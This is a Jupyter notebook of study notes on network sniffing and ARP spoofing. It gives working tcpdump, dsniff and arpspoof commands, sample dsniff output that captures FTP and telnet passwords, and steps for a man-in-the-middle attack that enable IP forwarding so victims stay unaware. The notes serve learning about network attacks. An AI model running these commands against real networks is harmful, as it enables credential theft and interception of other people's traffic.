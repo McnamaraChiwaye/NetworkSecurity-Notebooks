{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Network Sniffing\n",
    "- sniffing packets in unswitched network is fairly easy as packets are usually broadcasted to all the hosts in the network\n",
    "- hub is a network device that broadcasts all the packets e.g. and simply running the interface card in promiscuous mode would collect all the data that was broadcasted\n",
    "- sniffing packets in switched network is a bit challange\n",
    "- if systems are behind router or network switch they're using swtiched network\n",
    "    - packets are redirected to destination based on their MAC address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ifconfig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ifconfig <interfaceCard> promisc on"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ifconfig <interfaceCard>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! tcpdump -l -X 'ip host <ip>'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! dsniff -n"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "dsniff: listening on eth0\n",
    "-----------------\n",
    "12/10/02 21:43:21 tcp 192.168.0.193.32782 -> 192.168.0.118.21 (ftp)\n",
    "USER leech\n",
    "PASS l8@nite\n",
    "-----------------\n",
    "12/10/02 21:47:49 tcp 192.168.0.193.32785 -> 192.168.0.120.23 (telnet)\n",
    "USER root\n",
    "PASS 5eCr3t"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Active sniffing\n",
    "- in a switched network environment, packets are only sent to the port they are destined for (using MAC addresses)\n",
    "- promiscuous devices aren't able to sniff any additional packets that aren't destined for them\n",
    "- a switch usually has multiple ethernet ports with its own MAC addresses"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## arp spoofing\n",
    "\n",
    "- arp spoofing allows the attacker's to redirect the victims packets to her system\n",
    "- send a bunch of bogus ARP reply with attackers MAC but victim's IP; saying hey this is my IP and my MAC is this...\n",
    "- victim then refreshes its ARP cache table (unless its explicitly marked as permanent) or adds new entry\n",
    "- systems will accept ARP reply even if they don't send out ARP request\n",
    "- also called ARP cache poisoning\n",
    "- typically attackers would want to spoof gateway/router/switch that routes all the traffic from a local network out to the Internet\n",
    "\n",
    "<img src=\"arp-spoofing.png\" />"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## setps\n",
    "    - we'll do a simple MitM between two victims for ethical reasons given we have permission from the victims\n",
    "\n",
    "1. add the MAC addresses of the victims on the attackers machine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ping -c 1 -w 1 <victim1 IP>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ping -c 1 -w 1 <victim2 IP>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# test the arp cache\n",
    "! arp -n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. enable ip forwarding capability in the kernel so the victims do get their packets and are not suspicious of any spoofing activities"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# check - 0 means disabled\n",
    "! sysctl net.ipv4.ip_forward"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# enable if necessary on the fly\n",
    "sysctl -w net.ipv4.ip_forward=1\n",
    "# echo 1 > /proc/sys/net/ipv4/ip_forward"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### enable it permanently\n",
    "- open /etc/sysctl.conf file in an editor add the following line\n",
    "\n",
    "net.ipv4.ip_forward = 1\n",
    "\n",
    "run the following command to the enable the changes made\n",
    "\n",
    "$ sysctl -p /etc/sysctl.conf\n",
    "\n",
    "or on Ubuntu run the following command\n",
    "\n",
    "$ /etc/init.d/procps.sh restart"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3. fun arpspoof program that "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! man arpspoof"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! arpspoof -i <interface> -t <targetIP or victim1IP> -r <hostIP or victim2IP>"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
